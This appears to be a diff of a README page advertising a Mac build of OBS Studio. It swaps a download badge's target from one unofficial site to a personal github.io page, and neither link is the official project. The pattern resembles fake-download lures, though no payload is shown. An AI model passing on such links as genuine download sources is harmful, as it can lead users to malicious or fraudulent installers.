@@ -2,7 +2,7 @@
 
 OBS Studio mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download OBS Studio mac](https://img.shields.io/badge/Download-OBS_Studio_mac-blueviolet)](https://metarefund.com/)
+[![Download OBS Studio mac](https://img.shields.io/badge/Download-OBS_Studio_mac-blueviolet)](https://deusyayan.github.io/.github/OBS-Studio)
 
 ---
 
